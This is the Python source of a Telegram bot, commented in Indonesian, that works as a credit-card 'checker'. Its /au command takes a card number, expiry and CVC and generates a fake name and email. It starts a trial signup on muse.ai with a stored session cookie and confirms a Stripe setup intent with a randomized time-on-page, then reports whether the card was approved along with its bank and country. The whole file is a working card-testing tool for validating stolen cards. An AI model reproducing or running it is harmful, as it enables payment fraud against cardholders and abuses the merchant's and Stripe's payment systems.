import httpx
import os
import json
import random
import string
import time
import logging
from urllib.parse import urlencode
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown

# --- KONFIGURASI (TIDAK ADA PERUBAHAN) ---
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
USER_COOKIE = os.getenv('USER_COOKIE')
STRIPE_KEY = os.getenv('STRIPE_KEY')

if not all([TELEGRAM_BOT_TOKEN, USER_COOKIE, STRIPE_KEY]):
    raise ValueError("Secrets TELEGRAM_BOT_TOKEN, USER_COOKIE, atau STRIPE_KEY tidak ditemukan!")

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# --- FUNGSI-FUNGSI BANTUAN (TIDAK ADA PERUBAHAN) ---
def get_random_user():
    first_name = ''.join(random.choices(string.ascii_lowercase, k=7))
    last_name = ''.join(random.choices(string.ascii_lowercase, k=6))
    random_num = random.randint(10000, 99999)
    email = f"{first_name}.{last_name}{random_num}@yahoo.com"
    full_name = f"{first_name.capitalize()} {last_name.capitalize()}"
    return full_name, email

def get_bin_info(client: httpx.Client, bin_number: str):
    try:
        response = client.get(f'https://data.handyapi.com/bin/{bin_number}')
        if response.status_code == 200:
            data = response.json(); country_flag = data.get('Country', {}).get('Flag', '❓')
            return {"brand": data.get('Scheme', 'N/A').upper(), "type": data.get('Type', 'N/A').upper(), "level": data.get('Level', 'N/A').upper(), "bank": data.get('Bank', {}).get('Name', 'N/A').upper(), "country": f"{data.get('Country', {}).get('Name', 'N/A')}[{country_flag}]"}
    except Exception as e:
        logger.error(f"Error fetching BIN info: {e}")
    return {"brand": "N/A", "type": "N/A", "level": "N/A", "bank": "N/A", "country": "N/A"}

def process_card(client: httpx.Client, cc, mm, yy, cvc):
    full_name, email = get_random_user()
    muse_headers = {'Host': 'muse.ai', 'accept': 'application/json, text/javascript, */*; q=0.01', 'content-type': 'application/json; charset=UTF-8', 'x-requested-with': 'XMLHttpRequest', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36', 'origin': 'https://muse.ai', 'referer': 'https://muse.ai/join', 'cookie': USER_COOKIE}
    stripe_headers = {'Host': 'api.stripe.com', 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36', 'Stripe-Version': '2019-05-16'}
    try:
        start_payload = {"email": email, "name": full_name, "trial": 1, "tier": "basic", "cost_month": 16, "duration": 2629800, "access": "", "referral": "", "pm": "", "ab_pricing": 0, "ab_landing": 0}
        response_start = client.post('https://muse.ai/api/pay/start', headers=muse_headers, json=start_payload, timeout=30)
        response_start.raise_for_status()
        start_data = response_start.json()
        setup_intent_id, client_secret = start_data.get('id'), start_data.get('secret')
        if not all([setup_intent_id, client_secret]): return {"status": "error", "message": "Failed to get Setup Intent from muse.ai."}
        stripe_payload_data = {'payment_method_data[type]': 'card', 'payment_method_data[billing_details][name]': full_name, 'payment_method_data[billing_details][email]': email, 'payment_method_data[card][number]': cc, 'payment_method_data[card][cvc]': cvc, 'payment_method_data[card][exp_month]': mm, 'payment_method_data[card][exp_year]': yy, 'payment_method_data[payment_user_agent]': 'stripe.js/22a1c02c9a; stripe-js-v3/22a1c02c9a; card-element', 'payment_method_data[time_on_page]': str(random.randint(40000, 90000)), 'expected_payment_method_type': 'card', 'use_stripe_sdk': 'true', 'key': STRIPE_KEY, 'client_secret': client_secret}
        stripe_payload = urlencode(stripe_payload_data)
        response_stripe = client.post(f'https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm', headers=stripe_headers, content=stripe_payload, timeout=30)
        stripe_data = response_stripe.json()
        if stripe_data.get("status") == "succeeded": return {"status": "approved", "code": "succeeded"}
        else:
            decline_code = "unknown_decline"; error = stripe_data.get("error") or stripe_data.get("last_setup_error");
            if error: decline_code = error.get("decline_code", error.get("code", "unknown_decline"))
            return {"status": "decline", "code": decline_code}
    except httpx.HTTPStatusError as e: return {"status": "error", "message": f"HTTP Error: {e.response.status_code} - {e.response.text}"}
    except Exception as e: logger.error(f"Unexpected error in process_card: {e}"); return {"status": "error", "message": f"An unexpected error occurred: {e}"}

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    welcome_text = """👋 Welcome to Secure Auth!

Available Commands:

/au cc|mm|yy|cvc

Bot by: Secure Auth Team"""
    await update.message.reply_text(welcome_text)

async def au_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message, user = update.message, update.message.from_user; card_info = " ".join(context.args)
    if not card_info: await message.reply_text("❌ Format salah.\nContoh: `/au 434769...|01|29|422`", parse_mode=ParseMode.MARKDOWN_V2); return
    sent_message = await message.reply_text("⏳ Checking...")
    try:
        parts = card_info.replace(' ', '|').replace('/', '|').split('|');
        if len(parts) != 4: await sent_message.edit_text("❌ Format tidak valid."); return
        cc, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 2: yy = "20" + yy
        with httpx.Client(http2=True) as client:
            result = process_card(client, cc, mm, yy, cvc); bin_info = get_bin_info(client, cc[:6])
        cc_masked = f"{cc[:6]}...{cc[-4:]}"
        if result['status'] == 'approved': status_text, result_text, code_text = "Approved! ✅", "Succeeded", result['code']
        elif result['status'] == 'decline': status_text, result_text, code_text = "Decline! ❌", result['code'], result['code']
        else: status_text, result_text, code_text = "Error! ⚠️", "Processing Error", result['message']
        
        # --- LOGIKA BARU YANG BENAR ---
        # 1. Gabungkan string CC yang mentah terlebih dahulu.
        full_cc_string = f"{cc_masked}|{mm}|{yy}|{cvc}"

        # 2. Escape SEMUA variabel yang akan dimasukkan ke dalam pesan.
        #    Menggunakan str() adalah praktik yang aman untuk memastikan tipe datanya benar.
        escaped_cc = escape_markdown(full_cc_string, version=2)
        escaped_result = escape_markdown(str(result_text), version=2)
        escaped_code = escape_markdown(str(code_text), version=2)
        escaped_brand = escape_markdown(str(bin_info['brand']), version=2)
        escaped_type = escape_markdown(str(bin_info['type']), version=2)
        escaped_level = escape_markdown(str(bin_info['level']), version=2)
        escaped_bank = escape_markdown(str(bin_info['bank']), version=2)
        escaped_country = escape_markdown(str(bin_info['country']), version=2)
        escaped_user = escape_markdown(user.username or user.first_name, version=2)
        
        # 3. Buat pesan akhir menggunakan variabel yang sudah aman (escaped).
        response_text = f"""
↬ Secure | Auth ↫
- - - - - - - - - - - - - - - - - - - - -
⇻ CC: `{escaped_cc}`
⇻ Status: {status_text}
⇻ Result: {escaped_result}
⇻ Code: `{escaped_code}`
- - - - - - - - - - - - - - - - - - - - -
⇻ Brand: `{escaped_brand}`
⇻ Type: `{escaped_type}`
⇻ Level: `{escaped_level}`
⇻ Bank: `{escaped_bank}`
⇻ Country: `{escaped_country}`
- - - - - - - - - - - - - - - - - - - - -
\(↯\) Checked by: @{escaped_user}
"""
        await sent_message.edit_text(response_text, parse_mode=ParseMode.MARKDOWN_V2)
    except Exception as e:
        logger.error(f"Error in au_command: {e}")
        await sent_message.edit_text(f"Terjadi kesalahan internal. Error: {e}")

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("au", au_command))
    print("Bot berjalan...")
    application.run_polling()

if __name__ == '__main__':
    main()
